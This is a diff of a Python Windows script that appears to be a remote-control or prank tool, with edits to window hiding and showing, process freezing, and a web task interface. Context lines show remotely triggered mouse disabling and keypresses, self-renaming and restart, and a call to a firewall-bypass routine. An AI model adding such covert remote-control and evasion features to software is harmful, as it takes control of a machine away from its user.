-    done_vary_tasks.append(identifier)
-    sendAllVaryHosts(buildup)
-
-def isIn(name, list): 
-    """Checks if a name is present in a list (case-insensitive)."""
-    for i in list:
-        if name.lower() in i.lower():
-            return True
-    return False
     
 def procKill(name):
     """Kills a process by its name."""
@@ -2972,7 +3041,7 @@ def SmartAssNoInternet():
     
     def resetback():
         """Resets variables and behavior."""
-        nonlocal AmountOfTimeWithoutInternet_check, AmountOfTimeInSecondsWithoutInternet, previousTime, wastriggedduetonointernet
+        global AmountOfTimeWithoutInternet_check, AmountOfTimeInSecondsWithoutInternet, previousTime, wastriggedduetonointernet
         AmountOfTimeWithoutInternet_check = 0
         AmountOfTimeInSecondsWithoutInternet = 0
         autofreezeunknownprocesses = False
@@ -2992,6 +3061,8 @@ def SmartAssNoInternet():
                 resetback()
                 wastriggedduetonointernet = False
                 print('resetting SmartAssNoInternet behavior as internet is back on.')
+            elif INTERNET and not wastriggedduetonointernet:
+                time.sleep(10)
             else:
                 wastriggedduetonointernet = True
                 autofreezeunknownprocesses = True
@@ -3109,7 +3180,6 @@ ren "{os.path.join(get_script_directory(), get_script_filename())}" "{ToWhat_Fil
     runcmd("start " + os.path.join(get_script_directory(), random_string))
     kill_self()
 
-
 def get_hwnds_for_pid(pid):
     """Gets a list of window handles for a given process ID."""
     def callback(hwnd, hwnds):
@@ -3123,12 +3193,67 @@ def get_hwnds_for_pid(pid):
     win32gui.EnumWindows(callback, hwnds)
     return hwnds
 
+def set_always_on_top_via_pid(pid):
+    def callback(hwnd, hwnds):
+        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
+            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
+            if found_pid == pid:
+                hwnds.append(hwnd)
+        return True
+
+    hwnds = []
+    win32gui.EnumWindows(callback, hwnds)
+
+    if hwnds:
+        for hwnd in hwnds:
+            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
+                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+        print(f"Set {len(hwnds)} windows to always on top for PID {pid}")
+    else:
+        print(f"No visible windows found for PID {pid}")
+
+def set_always_on_top_via_name(name):
+    for pid in get_pids_for_process_name(name):
+        set_always_on_top_via_pid(pid)
+    
+def unset_always_on_top_by_pid(pid):
+    def callback(hwnd, hwnds):
+        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
+            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
+            if found_pid == pid:
+                hwnds.append(hwnd)
+        return True
+
+    hwnds = []
+    win32gui.EnumWindows(callback, hwnds)
+
+    if hwnds:
+        for hwnd in hwnds:
+            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, 
+                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+        print(f"Unset always on top for {len(hwnds)} windows of PID {pid}")
+    else:
+        print(f"No visible windows found for PID {pid}")
+        
+def unset_always_on_top_by_name(name):
+    """Unsets always on top for a process by its name."""
+    for pid in get_pids_for_process_name(name):
+        unset_always_on_top_by_pid(pid)
+    
+def maximize_process_via_pid(pid):
+    """Maximizes a process by its PID."""
+    hwnds = get_hwnds_for_pid(pid)
+    for hwnd in hwnds:
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
+        win32gui.SetForegroundWindow(hwnd)
+
 def get_pids_for_process_name(process_name):
     """Returns a list of PIDs for a given process name."""
     pids = []
     for process in psutil.process_iter():
         try:
-            if process.name() == process_name:
+            if process.name().lower() == process_name.lower():
                 pids.append(process.pid)
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
@@ -3139,94 +3264,105 @@ def hide_process_via_name(name):
     pids = get_pids_for_process_name(name)
     for pid in pids:
         hide_process_via_pid(pid)
-            
+
 def show_process_via_name(name):
+     # Initialize COM for this thread
+    pythoncom.CoInitialize()
+
     def enum_windows_callback(hwnd, result):
         _, pid = win32process.GetWindowThreadProcessId(hwnd)
         try:
             process = psutil.Process(pid)
             if process.name().lower() == name.lower():
                 title = win32gui.GetWindowText(hwnd)
-                if title: 
+                if title:  # Only include windows with a title
                     result.append((hwnd, title))
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
         return True
 
-    windows = []
-    win32gui.EnumWindows(enum_windows_callback, windows)
+    try:
+        windows = []
+        win32gui.EnumWindows(enum_windows_callback, windows)
 
-    if not windows:
-        print(f"No windows found for process: {name}")
-        return
+        if not windows:
+            print(f"No windows found for process: {name}")
+            return
 
-    shell = win32com.client.Dispatch("Shell.Application")
+        shell = win32com.client.Dispatch("Shell.Application")
 
-    for hwnd, title in windows:
-        try:
-            win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
-            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)            
-            win32gui.SetForegroundWindow(hwnd)
-        except Exception as e:
-            print(f"Error showing window '{title}' (handle: {hwnd}): {str(e)}")
+        for hwnd, title in windows:
+            try:
+                print(f"Attempting to show window: '{title}' (handle: {hwnd})")
+
+                # Make the window visible first
+                win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
+                
+                # Try to restore the window if it's minimized
+                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+                
+                # Bring the window to the foreground
+                win32gui.SetForegroundWindow(hwnd)
+                
+                win32gui.SetForegroundWindow(hwnd)
+                
+                print(f"Successfully showed window: '{title}' (handle: {hwnd})")
+            except Exception as e:
+                print(f"Error showing window '{title}' (handle: {hwnd}): {str(e)}")
+
+        print("Finished attempting to show hidden windows.")
+
+    finally:
+        # Uninitialize COM when we're done
+        pythoncom.CoUninitialize()
+
+# def show_process_via_pid(pid):
+#     """Shows a process from background by its PID."""
+#     hwnds = get_hwnds_for_pid(pid)
+#     for hwnd in hwnds:
+#         # Make the window visible first
+#             win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
+            
+#             # Try to restore the window if it's minimized
+#             win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+            
+#             # Bring the window to the foreground
+#             win32gui.SetForegroundWindow(hwnd)
+            
+ 
+#             win32gui.SetForegroundWindow(hwnd)
+ 
+# def show_process_via_name(name):
+#     """Shows a process from background by its name."""
+#     pids = get_pids_for_process_name(name)
+#     for pid in pids:
+#         show_process_via_pid(pid)
     
+def maximize_process_via_pid(pid):
+    """Maximizes a process by its PID."""
+    hwnds = get_hwnds_for_pid(pid)
+    for hwnd in hwnds:
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        win32gui.SetForegroundWindow(hwnd)
+        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)    
+
 def maximize_process_via_name(name):
-    def enum_windows_callback(hwnd, result):
-        _, pid = win32process.GetWindowThreadProcessId(hwnd)
-        try:
-            process = psutil.Process(pid)
-            if process.name().lower() == name.lower():
-                title = win32gui.GetWindowText(hwnd)
-                result.append((hwnd, title))
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-        return True
-
-    windows = []
-    win32gui.EnumWindows(enum_windows_callback, windows)
-
-    if not windows:
-        print(f"No windows found for process: {name}")
-        return
-
-    shell = win32com.client.Dispatch("Shell.Application")
-
-    for hwnd, title in windows:
-        try:
-            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
-            win32gui.SetForegroundWindow(hwnd)
-            win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
-        except Exception as e:
-            print(f"Error maximizing window '{title}' (handle: {hwnd}): {str(e)}")
+    """Maximizes a process by its name."""
+    pids = get_pids_for_process_name(name)
+    for pid in pids:
+        maximize_process_via_pid(pid)
     
+def minimize_process_via_pid(pid):
+    """Minimizes a process by its PID."""
+    hwnds = get_hwnds_for_pid(pid)
+    for hwnd in hwnds:
+        win32gui.ShowWindow(hwnd, win32con.SW_FORCEMINIMIZE)
     
 def minimize_process_via_name(name):
-    def enum_windows_callback(hwnd, result):
-        _, pid = win32process.GetWindowThreadProcessId(hwnd)
-        try:
-            process = psutil.Process(pid)
-            if process.name().lower() == name.lower():
-                title = win32gui.GetWindowText(hwnd)
-                if title:
-                    result.append((hwnd, title))
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-        return True
-
-    windows = []
-    win32gui.EnumWindows(enum_windows_callback, windows)
-
-    if not windows:
-        print(f"No windows found for process: {name}")
-        return
-
-    shell = win32com.client.Dispatch("Shell.Application")
-
-    for hwnd, title in windows:
-        try:
-            win32gui.ShowWindow(hwnd, win32con.SW_FORCEMINIMIZE)
-        except Exception as e:
-            print(f"Error minimizing window '{title}' (handle: {hwnd}): {str(e)}")
+    """Minimizes a process by its name."""
+    pids = get_pids_for_process_name(name)
+    for pid in pids:
+        minimize_process_via_pid(pid)
 
 def hide_process_via_pid(pid):
     """Hides a process by its PID."""
@@ -3248,7 +3384,6 @@ def get_own_parent_process_pid():
 
 def freeze_all_processes():
     """Freezes all processes except for essential system processes."""
-    global windowsDoneFrozen
     pids_tocheck = get_process_connected_pids(get_own_parent_process_pid())
     tonotfreeze = [
         "System", "OpenConsole.exe", "MemCompression", "wlms.exe", 'svchost.exe', 
@@ -3265,9 +3400,7 @@ def freeze_all_processes():
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
             print(f'Error while freezing: {e}')
     pids_tocheck.extend(pids)
-    if windowsDoneFrozen:
-        return "already done"
-    windowsDoneFrozen = True
+
     for i in psutil.process_iter():
         try:
             if i.pid in pids_tocheck:
@@ -3279,22 +3412,13 @@ def freeze_all_processes():
         
 def unfreeze_all_processes():
     """Unfreezes all processes."""
-    global windowsDoneFrozen
     for i in psutil.process_iter():
         try:
             i.resume()
         except:
             pass
-    windowsDoneFrozen = False
         
-def toggleFreezingAll():
-    """Toggles the freezing of all processes."""
-    global windowsDoneFrozen
-    if not windowsDoneFrozen:
-        freeze_all_processes()
-    else:
-        unfreeze_all_processes()
-        
+
 def restart_self():
     """Restarts the script."""
     runcmd(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
@@ -3675,7 +3799,7 @@ def websiteUI():
         elif task == 'disablemouse':
             print("Disabling mouse")
             disable_mouse()
-        elif task == 'me and the boys!':
+        elif task == 'meandtheboys':
             print("It's me and the boys time!")
             MeAndTheBoys()
         elif task == 'presskeys':
@@ -3722,10 +3846,6 @@ def mainuirun():
         except Exception as e:
             print(f'Error in websiteUI: {e} \nRetrying in 3 seconds')
             slp(3)
-
-mainui = threading.Thread(target=mainuirun)
-mainui.start()
-print('server started on: http://' + socket.gethostbyname(socket.gethostname()) + ':10001')
 
 def onStartup():
     """Handles startup routines, including network scanning and connection establishment."""
@@ -3902,24 +4022,6 @@ def startdvdanim():
             print(e)    
 
 dvd_runthread = KThread(target=startdvdanim) # Needs to be here due to definition errors
-
-def dvdtimeout(howlongofatimetocheck):
-    """Sets the timeout for the DVD screensaver."""
-    global timeoutfordvd, dvd_runthread, killablethread_thread
-    print("setting timeout to: " + str(howlongofatimetocheck))
-    timeoutfordvd = howlongofatimetocheck
-    if dvd_runthread.is_alive() and howlongofatimetocheck == 0:
-        print('Killing DVD thread')
-        killablethread_thread.kill()
-        dvd_runthread.kill()
-        dvd_runthread = KThread(target=startdvdanim)
-        return
-    if not dvd_runthread.is_alive():
-        print("Starting DVD thread")
-        dvd_runthread.start()
-
-
-# FIX THIS MISSING WEIRD THING
 
 def dvdtimeout(howlongofatimetocheck):
     """Sets the timeout for the DVD animation."""
@@ -4163,6 +4265,7 @@ if len(sys.argv) > 1:
             bypassfirewall()
         restart_self()
 
+ 
 print('Got args: ', str(sys.argv))
 
 try:
